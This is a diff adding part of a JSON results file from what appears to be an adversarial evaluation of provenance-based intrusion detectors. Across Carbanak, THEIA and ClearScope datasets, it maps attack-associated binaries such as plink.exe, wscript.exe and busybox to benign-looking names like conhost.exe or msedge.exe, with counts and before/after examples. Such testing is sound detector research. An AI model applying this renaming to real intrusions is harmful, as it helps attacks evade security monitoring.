+    "fallback_to_process": false,
+    "baseline_runs": 494,
+    "renamed_nodes": 3
+   },
+   {
+    "key": "/windows/system32/wscript.exe",
+    "kind": "shell",
+    "gt_nodes": 17,
+    "replacement_key": "/windows/system32/windowspowershell/{v}/powershell.exe",
+    "replacement": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 12,
+    "renamed_nodes": 17
+   }
+  ],
+  "renamed_nodes": 28,
+  "renamed_gt": 27,
+  "still_unknown": 0,
+  "baseline_programs": 198,
+  "baseline_processes": 3184,
+  "top_shell": "/windows/system32/windowspowershell/{v}/powershell.exe",
+  "top_process": "/program files (x86)/microsoft/edge/application/msedge.exe",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\rdpclip.exe None",
+    "after": "subject c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\hostname.exe hostname",
+    "after": "subject c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe msedge",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\reg.exe None",
+    "after": "subject c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe None",
+    "gt": true
+   }
+  ],
+  "set": "CARBANAKV2_EDR-h2",
+  "N": 819918,
+  "registry": 1190567,
+  "test_nodes": 386556
+ },
+ "CARBANAKV2_EDR-h3": {
+  "targets": [
+   {
+    "key": "/windows/system32/openssh/ssh.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 3771,
+    "renamed_nodes": 5
+   },
+   {
+    "key": "/windows/system32/openssh/sshd.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 3771,
+    "renamed_nodes": 11
+   },
+   {
+    "key": "/windows/system32/rdpclip.exe",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 3771,
+    "renamed_nodes": 4
+   }
+  ],
+  "renamed_nodes": 20,
+  "renamed_gt": 7,
+  "still_unknown": 0,
+  "baseline_programs": 225,
+  "baseline_processes": 26182,
+  "top_shell": "/program files/windowsapps/pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0/python3.11.exe",
+  "top_process": "/windows/system32/conhost.exe",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\rdpclip.exe None",
+    "after": "subject c:\\windows\\system32\\conhost.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\rdpclip.exe None",
+    "after": "subject c:\\windows\\system32\\conhost.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\rdpclip.exe None",
+    "after": "subject c:\\windows\\system32\\conhost.exe None",
+    "gt": true
+   }
+  ],
+  "set": "CARBANAKV2_EDR-h3",
+  "N": 596239,
+  "registry": 1059619,
+  "test_nodes": 478433
+ },
+ "CARBANAKV2_EDR-h4": {
+  "targets": [
+   {
+    "key": "/windows/system32/openssh/ssh.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 2447,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/reg.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/program files (x86)/microsoft/edge/application/msedge.exe",
+    "replacement": "c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 2447,
+    "renamed_nodes": 3
+   },
+   {
+    "key": "/windows/system32/wscript.exe",
+    "kind": "shell",
+    "gt_nodes": 4,
+    "replacement_key": "/windows/system32/windowspowershell/{v}/powershell.exe",
+    "replacement": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 18,
+    "renamed_nodes": 4
+   }
+  ],
+  "renamed_nodes": 8,
+  "renamed_gt": 7,
+  "still_unknown": 0,
+  "baseline_programs": 214,
+  "baseline_processes": 10402,
+  "top_shell": "/windows/system32/windowspowershell/{v}/powershell.exe",
+  "top_process": "/program files (x86)/microsoft/edge/application/msedge.exe",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\openssh\\ssh.exe None",
+    "after": "subject c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\reg.exe None",
+    "after": "subject c:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe None",
+    "gt": true
+   },
+   {
+    "before": "subject c:\\windows\\system32\\wscript.exe None",
+    "after": "subject c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None",
+    "gt": true
+   }
+  ],
+  "set": "CARBANAKV2_EDR-h4",
+  "N": 332206,
+  "registry": 491298,
+  "test_nodes": 170414
+ },
+ "CARBANAKV2_EDR-h5": {
+  "targets": [
+   {
+    "key": "/windows/system32/control.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/system32/mstsc.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/system32/openssh/ssh.exe",
+    "kind": "process",
+    "gt_nodes": 2,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/system32/qwinsta.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/rdpclip.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/system32/servermanager.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 2
+   },
+   {
+    "key": "/windows/system32/smss.exe",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 6
+   },
+   {
+    "key": "/windows/system32/systempropertiesremote.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/syswow64/cmd.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 3
+   },
+   {
+    "key": "/windows/temp/plink.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 1
+   },
+   {
+    "key": "/windows/tiny.exe",
+    "kind": "process",
+    "gt_nodes": 1,
+    "replacement_key": "/windows/system32/conhost.exe",
+    "replacement": "c:\\windows\\system32\\conhost.exe",
+    "fallback_to_process": false,
+    "baseline_runs": 400,
+    "renamed_nodes": 2
+   }
+  ],
+  "renamed_nodes": 23,
+  "renamed_gt": 17,
+  "still_unknown": 0,
+  "baseline_programs": 73,
+  "baseline_processes": 2814,
+  "top_shell": "/windows/system32/windowspowershell/{v}/powershell.exe",
+  "top_process": "/windows/system32/conhost.exe",
+  "examples": [
+   {
+    "before": "subject c:\\windows\\system32\\smss.exe \\SystemRoot\\System32\\smss.exe 000000c4 00000084 ",
+    "after": "subject c:\\windows\\system32\\conhost.exe c:\\windows\\system32\\conhost.exe 000000c4 00000084 ",
+    "gt": false
+   },
+   {
+    "before": "subject c:\\windows\\system32\\servermanager.exe \"C:\\Windows\\system32\\ServerManager.exe\" ",
+    "after": "subject c:\\windows\\system32\\conhost.exe \"c:\\windows\\system32\\conhost.exe\" ",
+    "gt": false
+   },
+   {
+    "before": "subject c:\\windows\\syswow64\\cmd.exe None",
+    "after": "subject c:\\windows\\system32\\conhost.exe None",
+    "gt": false
+   }
+  ],
+  "set": "CARBANAKV2_EDR-h5",
+  "N": 28806,
+  "registry": 68023,
+  "test_nodes": 40811
+ },
+ "THEIA_E5-theia": {
+  "targets": [],
+  "renamed_nodes": 0,
+  "renamed_gt": 0,
+  "still_unknown": 0,
+  "baseline_programs": 52,
+  "baseline_processes": 458674,
+  "top_shell": "/bin/dash",
+  "top_process": "/bin/dash",
+  "examples": [],
+  "set": "THEIA_E5-theia",
+  "N": 920492,
+  "registry": 1550195,
+  "test_nodes": 749962
+ },
+ "CLEARSCOPE_E5-clearscope": {
+  "targets": [
+   {
+    "key": "/data/data/de.belu.appstarter/busybox",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "/system/bin/app_process64",
+    "replacement": "/system/bin/app_process64",
+    "fallback_to_process": false,
+    "baseline_runs": 20495,
+    "renamed_nodes": 10
+   },
+   {
+    "key": "/data/local/tmp/tester",
+    "kind": "process",
+    "gt_nodes": 4,
+    "replacement_key": "/system/bin/app_process64",
+    "replacement": "/system/bin/app_process64",
+    "fallback_to_process": false,
+    "baseline_runs": 20495,
+    "renamed_nodes": 4
+   }
+  ],
+  "renamed_nodes": 14,
+  "renamed_gt": 8,
+  "still_unknown": 0,
+  "baseline_programs": 93,
+  "baseline_processes": 30352,
+  "top_shell": "/system/bin/sh",
+  "top_process": "/system/bin/app_process64",
+  "examples": [
+   {
+    "before": "subject None /data/data/de.belu.appstarter/busybox",
+    "after": "subject None /system/bin/app_process64",
+    "gt": true
+   },
+   {
+    "before": "subject None /data/data/de.belu.appstarter/busybox",
+    "after": "subject None /system/bin/app_process64",
+    "gt": true
+   },
+   {
+    "before": "subject None /data/data/de.belu.appstarter/busybox",
+    "after": "subject None /system/bin/app_process64",
+    "gt": true
+   }
+  ],
+  "set": "CLEARSCOPE_E5-clearscope",
+  "N": 226438,
+  "registry": 335455,
+  "test_nodes": 150964
+ }
+}
